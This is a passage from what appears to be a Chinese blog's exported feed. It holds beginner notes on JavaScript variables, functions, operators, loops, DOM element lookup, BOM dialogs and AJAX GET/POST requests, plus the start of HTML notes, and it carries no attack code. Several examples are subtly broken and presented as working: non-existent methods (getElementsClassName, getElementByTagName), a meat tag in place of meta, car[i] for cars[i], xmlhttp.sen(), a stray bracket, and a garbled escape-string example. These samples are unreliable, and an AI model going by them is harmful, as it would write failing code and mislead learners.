carname=&quot;Volvo&quot;;</code></pre><p>（3）一条语句，多个变量：在一条语句中声明多个变量。语句使用var开头，使用逗号分隔变量；</p><pre><code class="javascript">var name=&quot;Gates&quot;,age=56,job=&quot;CEO&quot;;</code></pre><p>（4）横跨多行声明</p><pre><code class="javascript">var name=&quot;Gates&quot;,    age=56,    job=&quot;CEO&quot;;</code></pre><p>（5）无值变量：只声明了变量，但未为变量赋值，值=undefined</p><pre><code class="javascript">var carname;</code></pre><p>（6）重新声明变量：重新声明变量只要未重新赋值，变量原有的值不变，若重新赋值，则该变量的原有值被覆盖。</p><pre><code class="javascript">var carname=&quot;Volvo&quot;; var carname;</code></pre><h3 id="局部变量和全局变量"><a href="#局部变量和全局变量" class="headerlink" title="局部变量和全局变量"></a>局部变量和全局变量</h3><p>（1）局部变量：在JavaScript函数内部声明的变量（使用var）是局部变量，所以只能在函数内部访问它。（该变量的作用域是局部的）。可以在不同的函数中使用名称相同的局部变量，因为只有声明过该变量的函数才能识别出该变量。只要函数运行完毕，本地变量就会被删除。</p><p>（2）全局变量：在函数外声明的变量是全局变量，网页上的所有脚本和函数都能访问它。全局变量会在页面关闭后被删除。</p><p>（3）把值赋给尚未声明的变量，该变量将被自动作为全局变量声明。</p><h3 id="JavaScript的基本数据类型"><a href="#JavaScript的基本数据类型" class="headerlink" title="JavaScript的基本数据类型"></a>JavaScript的基本数据类型</h3><p>（1）三种基本的数据类型：</p><ul><li>数值（整数和实数）</li><li>字符串型（用’’或””括起来的字符或数值）</li><li>布尔型（使用True或False表示）</li></ul><p>（2）常量：</p><ul><li>整型常量</li><li>实型常量</li><li>布尔值</li><li>字符型常量</li><li>空值</li></ul><p>（3）变量：由开发人员自行定义</p><p>（4）JavaScript拥有动态类型，相同的变量可用作不同的类型</p><pre><code class="javascript">var x; //x为undefinedvar x = 6; //x为数字var x = &quot;Bill&quot;; //x为字符串</code></pre><p>（5）JavaScript字符串，可以使用单引号或双引号引用任意文本</p><pre><code class="javascript">var carname=&quot;Bill Gates&quot;;var carname=&#39;Bill Gates&#39;;</code></pre><p>（6）JavaScript字符串，允许在字符串中使用引号，只要不匹配字符中的引号即可</p><pre><code class="javascript">var answer=&quot;He is called &#39;Bill&#39;&quot;;var answer=&#39;He is called &quot;Bill&quot;&#39;;var answer=&quot;&quot;\&#39;\&quot;Bill&quot;&#39;&quot;&quot;   //其中\表示转义符，结果为var answer=\\\&#39;        //结果为\&#39;var a=&#39;&quot;&#39;;var b=&quot;&#39;&quot;;var c=&quot;&lt;div&gt;&quot;;var d= a+b+c+b+a      //用加号作为连接符，结果为&quot;&#39;&lt;div&gt;&#39;&quot;var e=1+2          //结果e为3var f=1+&quot;2&quot;        //结果f为12var g=1+&quot;&quot;         //结果g为1，但typeof(g)为string</code></pre><p>（7）JavaScript数字：JavaScript只有一种数字类型，数字可以带小数点，也可以不带</p><pre><code class="javascript">var x1=34.00;var x2=34;</code></pre><p>（8）极大或极小的数字可以通过科学（指数）计数法书写</p><pre><code class="javascript">var x=123e5;  //12300000var y=123e-5; //0.00123</code></pre><p>（9）JavaScript布尔，布尔（逻辑）只能有两个值：true或false</p><pre><code class="javascript">var x=truevar y=false</code></pre><h3 id="JavaScript函数"><a href="#JavaScript函数" class="headerlink" title="JavaScript函数"></a>JavaScript函数</h3><p>（1）JavaScript函数语法。</p><ul><li>函数就是包裹在花括号中的代码块，前面使用了关键词function：</li></ul><pre><code class="JavaScript">function functionname()&#123;    这里是要执行的代码&#125;</code></pre><ul><li>调用带参数的函数，可以向其传递值，这些值被称为参数。</li></ul><pre><code class="javascript">myFunction(argument1,argument2)</code></pre><ul><li>当声明函数时，需要把参数作为变量来声明：</li></ul><pre><code class="JavaScript">function myFunction(var1,var2)&#123;    这里是要执行的代码&#125;</code></pre><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body&gt;        &lt;p&gt;          请点击其中的一个按钮，来调用带参数的函数。          &lt;/p&gt;        &lt;button onclick=&quot;myFunction(&#39;Harry Potter&#39;,&#39;Wizard&#39;)&quot;&gt;            点击这里        &lt;/button&gt;        &lt;button onclick=&quot;myFunction(&#39;Bob&#39;,&#39;Builder&#39;)&quot;&gt;            点击这里        &lt;/button&gt;        &lt;script&gt;            function myFunction(name,job)&#123;                alert(&quot;Welcome &quot;+name+&quot;,the &quot;+job);            &#125;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>（2）使用函数将 值返回调用它的地方，通过使用return语句就可以实现，在使用return语句时，函数会停止执行，并返回指定的值。</p><pre><code class="javascript">//带有返回值的函数语法function myFunction()&#123;var x=5;return x;&#125;</code></pre><p>注意：整个JavaScript并不会停止执行，仅仅是函数。JavaScript将继续从调用函数的地方执行代码。</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body&gt;        &lt;p&gt;            本例调用的函数会执行一个计算，然后返回结果：        &lt;/p&gt;        &lt;p id=&quot;demo&quot;&gt;        &lt;/p&gt;        &lt;script&gt;            function myFunction(a,b)&#123;                return a*b;            &#125;            document.getElementById(&quot;demo&quot;).innerHTML=myFunction(4,3);        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="JavaScript运算符"><a href="#JavaScript运算符" class="headerlink" title="JavaScript运算符"></a>JavaScript运算符</h3><h4 id="算术运算符与赋值运算符"><a href="#算术运算符与赋值运算符" class="headerlink" title="算术运算符与赋值运算符"></a>算术运算符与赋值运算符</h4><p>算术运算符用于执行变量或值之间的算术运算，赋值运算符用于给JavaScript变量赋值</p><table><thead><tr><th align="center">运算符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">加</td></tr><tr><td align="center">-</td><td align="center">减</td></tr><tr><td align="center">*</td><td align="center">乘</td></tr><tr><td align="center">/</td><td align="center">除</td></tr><tr><td align="center">%</td><td align="center">取余（保留整数）</td></tr><tr><td align="center">++</td><td align="center">累加（x=++5，x=6）</td></tr><tr><td align="center">–</td><td align="center">递减（x=–5，x=4）</td></tr><tr><td align="center">=</td><td align="center">赋值x=y</td></tr><tr><td align="center">+=</td><td align="center">x+=y等价于x=x+y</td></tr><tr><td align="center">-=</td><td align="center">x-=y等价于x=x-y</td></tr><tr><td align="center">*=</td><td align="center">x*=y等价于x=x*y</td></tr><tr><td align="center">/=</td><td align="center">x/=y等价于x=x/y</td></tr><tr><td align="center">%=</td><td align="center">x%=y等价于x=x%y</td></tr></tbody></table><h4 id="比较和逻辑运算符"><a href="#比较和逻辑运算符" class="headerlink" title="比较和逻辑运算符"></a>比较和逻辑运算符</h4><p>（1）比较运算符在逻辑语句中使用，以测定变量或值是否相等</p><table><thead><tr><th align="center">运算符</th><th align="center">描述</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">==</td><td align="center">等于</td><td align="center">5==8为false</td></tr><tr><td align="center">===</td><td align="center">全等(值和类型都要相等)</td><td align="center">5===5为true，5===”5”为false</td></tr><tr><td align="center">!=</td><td align="center">不等于</td><td align="center">5!=8为true</td></tr><tr><td align="center">&gt;</td><td align="center">大于</td><td align="center"></td></tr><tr><td align="center">&lt;</td><td align="center">小于</td><td align="center"></td></tr><tr><td align="center">&gt;=</td><td align="center">大于等于</td><td align="center"></td></tr><tr><td align="center">&lt;=</td><td align="center">小于等于</td><td align="center"></td></tr></tbody></table><p>（2）逻辑运算符用于测定变量或值之间的逻辑</p><table><thead><tr><th align="center">运算符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&amp;&amp;</td><td align="center">and</td></tr><tr><td align="center">||</td><td align="center">or</td></tr><tr><td align="center">!</td><td align="center">not</td></tr></tbody></table><h3 id="javascript条件语句"><a href="#javascript条件语句" class="headerlink" title="javascript条件语句"></a>javascript条件语句</h3><p>（1）if语句：只有当指定条件为true时，执行该条件下的代码</p><p>（2）if…else语句：当条件为true时执行if下的代码，当条件为false时执行else下的代码</p><p>（3）if…else if…else：使用该语句来选择多个代码块之一来执行</p><p>（4）switch语句：使用该语句来选择多个代码块之一来执行</p><h3 id="JavaScript循环语句"><a href="#JavaScript循环语句" class="headerlink" title="JavaScript循环语句"></a>JavaScript循环语句</h3><p>（1）for语句：</p><pre><code>for(语句1;语句2;语句3)&#123;    被执行的代码块&#125;</code></pre><ul><li>语句1在循环开始前执行(可选)</li><li>语句2定义循环的条件(可选)</li><li>语句3在循环已被执行后执行(可选)</li></ul><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body&gt;        &lt;script&gt;            cars=[&quot;BMW&quot;,&quot;Volvo&quot;,&quot;Ford&quot;];            for(var i=0;i&lt;cars.length;i++)&#123;                document.write(car[i]+&quot;&lt;br&gt;&quot;);            &#125;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>（2）while语句</p><pre><code>while(条件)&#123;需要执行的代码&#125;例如：while(i&lt;5)&#123;x=x+&quot;The number is &quot;+i+&quot;&lt;br&gt;&quot;;i++;&#125;</code></pre><p>（3）do…while语句</p><pre><code>do&#123;需要执行的代码&#125;while(条件)</code></pre><h3 id="break和continue语句"><a href="#break和continue语句" class="headerlink" title="break和continue语句"></a>break和continue语句</h3><p>（1）break语句：用于跳出当前循环，跳出循环后会继续执行该循环之后的代码。</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body&gt;        &lt;p&gt;            点击按钮，测试带有break语句的循环        &lt;/p&gt;        &lt;button onclick=&quot;myFunction()&quot;&gt;            点击这里        &lt;/button&gt;        &lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;        &lt;script&gt;            function myFunction()&#123;                var x=&quot;&quot;,i=0;                for(i=0;i&lt;10;i++)&#123;                    if(i==3)&#123;                        break;                    &#125;                    x=x + &quot;The number is &quot;+i+&quot;&lt;br&gt;&quot;;                &#125;                document.getElementById(&quot;demo&quot;).innerHTML=x;            &#125;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>（2）continue语句：中断循环中的迭代，若出现了指定的条件，然后继续循环中的下一个迭代。</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body&gt;        &lt;p&gt;            点击按钮执行循环，循环会跳过i=3的步骤        &lt;/p&gt;        &lt;button onclick=&quot;myFunction()&quot;&gt;            点击这里        &lt;/button&gt;        &lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;        &lt;script&gt;            function myFunction()&#123;                var x=&quot;&quot;,i=0;                for(i=0;i&lt;10;i++)&#123;                    if(i==3)&#123;                        continue;                    &#125;                    x=x + &quot;The number is &quot;+i+&quot;&lt;br&gt;&quot;;                &#125;                document.getElementById(&quot;demo&quot;).innerHTML=x;            &#125;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="JavaScript-DOM"><a href="#JavaScript-DOM" class="headerlink" title="JavaScript DOM"></a>JavaScript DOM</h2><p>（1）HTML DOM（文档对象模型）。对当前超文本进行操作的技术。当网页被加载时，浏览器会创建页面的文档对象模型，HTML DOM模型被构造为对象的树。</p><p>（2）通过可编程的对象模型，JavaScript获得了足够的能力来创建动态的HTML。</p><ul><li>JavaScript能够改变页面中的所有HTML元素</li><li>JavaScript能够改变页面中的所有HTML属性</li><li>JavaScript能够改变页面中的所有CSS样式</li><li>JavaScript能够对页面中的所有事件作出反应</li></ul><p>（3）通常要使用JavaScript操作HTML元素，就需要找到相应的元素，可通过如下的方法找到元素：</p><ul><li>通过id找到HTML元素</li><li>通过标签名找到HTML元素</li><li>通过类名找到HTML元素</li></ul><p>（4）DOM可以获取浏览器的cookie。在浏览器中使用快捷键F12进入控制台(console)，输入document.cookie就能获取浏览器的cookie。</p><p><img src="https://i.loli.net/2021/03/16/acUeO5FTR7PVQX8.png" alt="image-20210316181503816"></p><p>（5）DOM可以获取URL的数据，在控制台输入window.location就可获取到浏览器的URL数据</p><p><img src="https://i.loli.net/2021/03/16/PhWa3QA9vnIHszN.png" alt="image-20210316181801514"></p><h3 id="获取标签–基于id"><a href="#获取标签–基于id" class="headerlink" title="获取标签–基于id"></a>获取标签–基于id</h3><p>在使用JavaScript操作HTML元素，就需要找到相应的元素，可通过id获取元素</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meat charset=&quot;UTF-8&quot;&gt;&lt;/meat&gt;        &lt;title&gt;Goktech-javascript&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h1 id=&quot;demo&quot;&gt;welcome to gok&lt;/h1&gt;        &lt;script&gt;            var a=document.getElementById(&quot;demo&quot;);            document.write(&quot;这是基于Id抓取到的内容：&quot;+a.innerHTML);   //document基于DOM技术，用到某一个方法要加上一个点.如getElementById函数，表示通过id找到一个标签。innerHTML可修改元素内容。window是基于BOM技术        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/16/UXLgYtdNaQ9b8AE.png" alt="image-20210316183426660"></p><pre><code class="html">&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;script&gt;        function test()&#123;            document.getElementById(&quot;1&quot;).value=&quot;文本文档1&quot;; //找到id对应的标签后再用value方法修改改标签的值。            document.getElementById(&quot;2&quot;).value=&quot;文本文档2&quot;;            document.getElementById(&quot;3&quot;).href=&quot;http://www.goktech.cn&quot;;//找到id对应的标签后用href方法修改原a标签的值。        &#125;    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;1&quot; onclick=&quot;test()&quot;&gt;  //用onclick调用test函数    &lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;2&quot; onclick=&quot;test()&quot;&gt;    &lt;a href=&quot;www.baidu.com&quot; id=&quot;3&quot; onclick=&quot;test()&quot;&gt;百度&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/23/PA4lhXvJHSTzKNu.png" alt="image-20210323212113175"></p><p><img src="https://i.loli.net/2021/03/23/kMUy4m59fQAOZY8.png" alt="image-20210323212208821"></p><p><img src="https://i.loli.net/2021/03/23/uTtJAC1yasGLEgf.png" alt="image-20210323212231314"></p><h3 id="获取标签-–基于class"><a href="#获取标签-–基于class" class="headerlink" title="获取标签 –基于class"></a>获取标签 –基于class</h3><pre><code class="javascript">document.getElementsClassName(&quot;&quot;)[0]   //由于类并不唯一，所以可以在末尾加上[0]代表要取第一个标签</code></pre><h3 id="获取标签–基于Tagname"><a href="#获取标签–基于Tagname" class="headerlink" title="获取标签–基于Tagname"></a>获取标签–基于Tagname</h3><p>通过TagName获取元素；</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/meta&gt;        &lt;title&gt;Goktech-javascript&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h1&gt;welcome to gok!&lt;/h1&gt;        &lt;h1&gt;Javascript DOM&lt;/h1&gt;        &lt;script&gt;            var b=document.getElementByTagName(&quot;h1&quot;);            document.write(&quot;这是基于TagName抓取到的内容：&quot;+b[0].innerHTML);        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="获取标签–基于Div"><a href="#获取标签–基于Div" class="headerlink" title="获取标签–基于Div"></a>获取标签–基于Div</h3><p>通过Div获取元素</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/meta&gt;        &lt;title&gt;Goktech-javascript&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div id=&quot;demo&quot;&gt;            &lt;h1&gt;welcome to gok!&lt;/h1&gt;            &lt;h1&gt;Javascript DOM&lt;/h1&gt;        &lt;/div&gt;        &lt;script&gt;            var a=document.getElementById(&quot;demo&quot;);            var b=document.getElementByTagName(&quot;h1&quot;);            document.write(&quot;这是基于Div抓取到的内容：&quot;+b[0].innerHTML);        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="Javascript-BOM"><a href="#Javascript-BOM" class="headerlink" title="Javascript BOM"></a>Javascript BOM</h2><p>（1）BOM(Browser Object Model)，浏览器对象模型，对浏览器进行操作。它使JavaScript有能力与浏览器”对话“</p><p>（2）所有浏览器都支持window对象。它表示浏览器窗口。</p><ul><li>所有JavaScript全局对象、函数以及变量均自动成为window对象的成员。</li><li>全局变量是window对象的属性。</li><li>全局函数是window对象的方法。</li></ul><p>（3）window.open()   ——-打开新窗口。window.close()  ——-关闭当前窗口。 window.location.href —-页面跳转。</p><h3 id="BOM-window-open"><a href="#BOM-window-open" class="headerlink" title="BOM-window.open"></a>BOM-window.open</h3><p>window.open()实现的功能是打开一个新窗口，通过设置一个按钮，利用window.open()可以实现当点击按钮的时候，会打开一个新的页面(如例中的<a href="http://www.goktech.cn)，代码及现象如图：">http://www.goktech.cn)，代码及现象如图：</a></p><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;script&gt;            function win_open()&#123;                window.open(&quot;http://www.goktech.cn&quot;)            &#125;        &lt;/script&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input type=&quot;button&quot; value=&quot;Open Window&quot; onclick=&quot;win_open()&quot;/&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/16/BwrX6UfFc4VMtxq.png" alt="image-20210316224229904"></p><p><img src="https://i.loli.net/2021/03/16/suMivCgGxBAjZFD.png" alt="image-20210316224252251"></p><h3 id="BOM-window-close"><a href="#BOM-window-close" class="headerlink" title="BOM-window.close"></a>BOM-window.close</h3><p>window.close()实现的功能是关闭当前窗口，在本例中预先设置执行代码后会弹出一个新窗口，当点击设置的按钮后，此新窗口会被关闭，代码及现象如图：</p><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            function Winclose()&#123;                myWindow.close()            &#125;                &lt;/script&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input type=&quot;button&quot; value=&quot;Close myWindow&quot; onclick=&quot;Winclose()&quot;/&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            myWindow=window.open(&#39;&#39;,&#39;&#39;,&#39;width=200,height=100&#39;)            myWindow.document.write(&quot;这是一个示例窗口&quot;)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/PfxMvwjTXaOmSqb.png" alt="image-20210317145808454"></p><h3 id="Bom-window-location-href"><a href="#Bom-window-location-href" class="headerlink" title="Bom-window.location.href"></a>Bom-window.location.href</h3><p>window.location.href()实现的功能是页面跳转，利用window.location.href()设置一个想要跳转的页面，当执行代码时就会跳转到相应的位置，代码及现象如下：</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Goktech.javascript&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;script&gt;        window.location.href=&#39;http://www.goktech.cn&#39;    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/AlFSoMRB8nvUTuZ.png" alt="image-20210317150437014"></p><h3 id="BOM-消息框-alert"><a href="#BOM-消息框-alert" class="headerlink" title="BOM-消息框-alert"></a>BOM-消息框-alert</h3><p>alert(“文本”)：显示带有一段消息和一个确认按钮的警告框</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UFT-8&quot;&gt;        &lt;title&gt;Goktech.javascript&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input type=&quot;submit&quot; value=&quot;点击此按钮(alert)&quot; onclick=&quot;alert(&#39;这是由alert形成的弹框&#39;)&quot;&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/4cmGoHKRihvekpQ.png" alt="image-20210317151009427"></p><h3 id="BOM-消息框-confirm"><a href="#BOM-消息框-confirm" class="headerlink" title="BOM-消息框-confirm"></a>BOM-消息框-confirm</h3><p>confirm(“文本”)：显示带有一段消息以及确认按钮和取消按钮的对话框</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;Goktech.javascript&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input type=&quot;submit&quot; value=&quot;点击此按钮(confirm)&quot; onclick=&quot;confirm(&#39;这是由confirm形成的弹框&#39;)&quot;&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/w1kCMUD9ENZ4hma.png" alt="image-20210317151545748"></p><h3 id="BOM-消息框-prompt"><a href="#BOM-消息框-prompt" class="headerlink" title="BOM-消息框-prompt"></a>BOM-消息框-prompt</h3><p>prompt(“文本”)：显示可提示用户输入的对话框</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;Goktech-javascript&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input type=&quot;submit&quot; value=&quot;点击此按钮(prompt)&quot; onclick=&quot;prompt(&#39;这是由prompt形成的弹框&#39;)&quot;&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/3GV4TCYS8IwcXoz.png" alt="image-20210317152036718"></p><h2 id="AJAX的基本语法及应用"><a href="#AJAX的基本语法及应用" class="headerlink" title="AJAX的基本语法及应用"></a>AJAX的基本语法及应用</h2><p>（1）AJAX=Asynchronous JavScript and XML（异步的JavaScript和XML）</p><p>（2）AJAX是一种用于创建快速动态网页的技术。AJAX不是一种新的语言，而是一种新的标准方法；</p><p>（3）传统的网页（不使用AJAX）如果需要更新内容，必须重载整个网页面。AJAX技术通过在后台与服务器进行少量数据交换，AJAX可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p><p>（4）使用AJAX的应用程序案例：新浪微博、Google地图、开心网等等。</p><h3 id="AJAX请求方法"><a href="#AJAX请求方法" class="headerlink" title="AJAX请求方法"></a>AJAX请求方法</h3><p>如需将请求发送到服务器，使用XMLHttpRequest对象的open()和send()方法；</p><pre><code class="javascript">xmlhttp.open(&quot;GET&quot;,&quot;test1.txt&quot;,true);xmlhttp.sen();</code></pre><table><thead><tr><th align="left">open(method,url,async)</th><th align="left">规定请求的类型、URL以及是否异步处理请求。                                                                                         (1)method：请求的类型GET或POST                                                                                (2)url：文件在服务器上的位置                                                                                             (3)async：true（异步）或false（同步）</th></tr></thead><tbody><tr><td align="left">send(string)</td><td align="left">将请求发送到服务器。                                                                                                            *string：仅用于POST请求</td></tr></tbody></table><h3 id="请求实现-get请求"><a href="#请求实现-get请求" class="headerlink" title="请求实现-get请求"></a>请求实现-get请求</h3><p>（1）一个简单的GET请求：</p><pre><code>xmlhttp.open(&quot;GET&quot;,&quot;demo_get.asp&quot;,true);xmlhttp.send();</code></pre><p>（2）通过GET方法发送信息，请向URL添加信息：</p><pre><code>xmlhttp.open(&quot;GET&quot;,&quot;demo_get2.asp?fname=Bill&amp;lname=Gates&quot;,true);xmlhttp.send();</code></pre><p>（3）AJAX请求代码</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;    function loadXMLDoc()&#123;        var xmlhttp;        if (window.XMLHttpRequest)&#123;            xmlhttp=new XMLHttpRequest();        &#125;        else&#123;            xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);        &#125;        xmlhttp.onreadystatechange=function()&#123;            if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)&#123;                document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;            &#125;        &#125;        xmlhttp.open(&quot;GET&quot;,&quot;/ajax/demo_get2.asp?fname=Bill&amp;name=Gates&quot;,true);]        xmlhttp.send();    &#125;    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2&gt;AJAX&lt;/h2&gt;    &lt;button type=&quot;button&quot; onclick=&quot;loadXMLDoc()&quot;&gt;请求数据&lt;/button&gt;    &lt;div id=&quot;myDiv&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="请求实现-POST请求"><a href="#请求实现-POST请求" class="headerlink" title="请求实现-POST请求"></a>请求实现-POST请求</h3><p>（1）一个简单的POST请求：</p><pre><code>xmlhttp.open(&quot;POST&quot;,&quot;demo_post.asp&quot;,true);xmlhttp.send();</code></pre><p>（2）若需要像HTML表单那样POST数据，可以使用setRequestHeader()来添加HTTP头。然后在send()方法中规定想要发送的数据：</p><pre><code>xmlhttp.open(&quot;POST&quot;,&quot;ajax_test.asp&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;fname=Bill&amp;lname=Gates&quot;);</code></pre><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>setRequestHeader(header,value)</td><td>向请求添加HTTP头                                                                                                           (1)header：规定头的名称                                                                                          (2)value：规定头的值</td></tr></tbody></table><p>（3）AJAX请求代码</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;    function loadXMLDoc()&#123;        var xmlhttp;        if (window.XMLHttpRequest)&#123;            xmlhttp=new XMLHttpRequest();        &#125;        else&#123;            xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);        &#125;        xmlhttp.onreadystatechange=function()&#123;            if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)&#123;                document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;            &#125;        &#125;        xmlhttp.open(&quot;POST&quot;,&quot;ajax_test.asp&quot;,true);        xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);        xmlhttp.send(&quot;fname=Bill&amp;lname=Gates&quot;);    &#125;    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2&gt;AJAX&lt;/h2&gt;    &lt;button type=&quot;button&quot; onclick=&quot;loadXMLDoc()&quot;&gt;请求数据&lt;/button&gt;    &lt;div id=&quot;myDiv&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML代码进阶</title>
      <link href="2021/03/15/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/HTML%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/"/>
      <url>2021/03/15/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/HTML%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="网站前端架构介绍"><a href="#网站前端架构介绍" class="headerlink" title="网站前端架构介绍"></a>网站前端架构介绍</h2><h3 id="WEB应用的基本架构"><a href="#WEB应用的基本架构" class="headerlink" title="WEB应用的基本架构"></a>WEB应用的基本架构</h3><p><img src="https://i.loli.net/2021/03/15/52cAsmaUxB4gwnF.png" alt="image-20210315145057858"></p><h3 id="从网页制作到前端开发"><a href="#从网页制作到前端开发" class="headerlink" title="从网页制作到前端开发"></a>从网页制作到前端开发</h3><p>（1）WEB1.0时代的产物是“网页制作”，这时候的网页主要是静态网页，即没有与用户进行交互，而仅仅供读者浏览的网页，例如一篇日志、博文等展示性文章。（缺乏交互性）</p><p>（2）WEB2.0时代，网页有静态网页和动态网页。</p><ul><li>所谓动态网页，就是用户不仅可以浏览网页，还可以与服务器进行交互。例如用户登录某个网站，输入账号密码，由服务器对该用户的账号进行验证，通过验证即可成功登录。</li><li>WEB2.0时代的网页不仅包含绚丽的动画、音频和视频，还可以让用户在网页中进行评论交流、上传和下载文件等。具有良好的交互性。因而不再叫做“网页制作”，而是叫“WEB前端开发”。</li></ul><h3 id="前端网站搭建所需环境"><a href="#前端网站搭建所需环境" class="headerlink" title="前端网站搭建所需环境"></a>前端网站搭建所需环境</h3><p>（1）Web服务程序：Apache或IIS</p><p>（2）数据库服务程序：mysql或mssql</p><p>（3）操作脚本引擎：PHP或JSP</p><h3 id="前端架构核心技术"><a href="#前端架构核心技术" class="headerlink" title="前端架构核心技术"></a>前端架构核心技术</h3><p>（1）网页最主要由3部分组成：结构、表现和行为，目前模式是HTML、CSS和JavaScript。</p><p>（2）HTML是网页的结构，便于浏览器进行解析。CSS是网页的外观，使HTML文档更美观。而JavaScript是页面的行为赋予网站一些特定的动作，如放大或缩小图片。</p><p>（3）CSS（Cascading Style Sheets）,用来表现HTML文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p><p>（4）HTML文档中可以嵌入css和JavaScript，也可以将css和JavaScript单独下载css或js文件中，然后引入HTML文档中。</p><h2 id="HTML基本语法"><a href="#HTML基本语法" class="headerlink" title="HTML基本语法"></a>HTML基本语法</h2><h3 id="代码编写编辑器"><a href="#代码编写编辑器" class="headerlink" title="代码编写编辑器"></a>代码编写编辑器</h3><p>（1）离线编辑器：pycharm、Sublime 